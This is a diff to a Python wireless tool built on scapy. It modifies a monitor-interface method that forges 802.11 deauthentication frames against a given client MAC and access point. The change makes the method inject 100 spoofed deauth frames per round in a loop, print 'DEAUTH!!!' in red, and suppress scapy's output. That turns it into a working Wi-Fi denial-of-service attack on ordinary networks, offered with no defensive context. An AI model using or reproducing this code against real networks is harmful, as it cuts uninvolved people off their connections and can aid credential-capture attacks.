@@ -1,8 +1,10 @@
 import struct
 import subprocess
 import threading
+from time import sleep
 
 from scapy.layers.dot11 import Dot11, Dot11Elt, sendp, Dot11Deauth, RadioTap
+from termcolor import cprint
 
 from .core import Station, AP
 
@@ -82,12 +84,15 @@ class MonitorInterface(Interface):
     def __init__(self, name, channel=None):
         super().__init__(name, monitor_mode=True, channel=channel)
 
-    def deauth(self, target_mac, bssid, count=10, channel=None):
+    def deauth(self, target_mac, bssid, count=1, channel=None):
         self.channel_lock.acquire()
         if channel:
             self.set_channel(channel)
         pkt = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
-        self.inject(pkt)
+        for i in range(count):
+            for j in range(100):
+                self.inject(pkt)
+            cprint("DEAUTH!!!", 'red')
         self.channel_lock.release()
 
     def get_new_client(self):
@@ -97,7 +102,7 @@ class MonitorInterface(Interface):
         return target
 
     def inject(self, pkt):
-        sendp(pkt, iface=self.name)
+        sendp(pkt, iface=self.name, verbose=False)
 
     def scan(self, pkt):
         client_mgmt_subtypes = (0, 2, 4)
